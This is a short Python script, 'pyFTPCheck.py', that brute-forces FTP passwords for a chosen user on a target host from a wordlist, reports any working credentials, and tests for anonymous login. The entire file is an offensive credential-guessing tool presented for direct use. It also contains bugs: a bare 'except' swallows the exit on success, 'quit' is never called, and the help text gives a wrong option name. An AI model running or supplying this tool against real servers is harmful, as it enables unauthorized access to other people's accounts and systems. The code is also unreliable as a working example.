#!/usr/bin/env python3
import argparse
import sys
import os
import re
from ftplib import FTP

info = '''
Usage: python pyFTPCheck.py [options]\n
Options: -t, --target    <hostname/ip>   |   Target\n
         -u, --user      <user>          |   User\n
         -w, --wordlist  <filename>      |   Wordlist\n
         -h, --help      <help>          |   print help\n
Example: python pyFTPCheck.py -t 10.10.10.10 -u admin -w /usr/share/wordlists/RockYou.txt
'''

def checkAnonLogin(tgt):
    try:
        ftp = FTP(tgt)
        ftp.login()
        print("\n[+] Anonymous Login Successful.")
        ftp.quit()
    except:
        pass

def bruter(tgt,uname,wordlst):
    try:
        wordlist = open(wordlst,"r")
        words = wordlist.readlines()
        for word in words:
            word = word.strip()
            ftpLogin(tgt,uname,word)
    except:
        print("\n[-] Wordlist not found - exiting.\n")
        sys.exit(0)

def ftpLogin(tgt,uname,passwd):
    try:
        ftp = FTP(tgt)
        ftp.login(uname,passwd)
        ftp.quit
        print("\n[+] Login Successful!")
        print("\n[+] Username: {}".format(uname))
        print("\n[+] Password: {}".format(passwd))
        sys.exit()
    except:
        pass

def main():
    print("\n\n[+][+]Script execution underway.[+][+]\n\n")
    parser = argparse.ArgumentParser()
    parser.add_argument("-t","--target")
    parser.add_argument("-u","--username")
    parser.add_argument("-w","--wordlist")
    args = parser.parse_args()
    if not args.target or not args.username or not args.wordlist:
        print(info)
        sys.exit(0)
    tgt = args.target
    uname = args.username
    wordlst = args.wordlist
    bruter(tgt,uname,wordlst)
    checkAnonLogin(tgt)
    print("\n\n[+][+]Script execution finished.[+][+]\n\n")
    
if __name__ == '__main__':
    main()
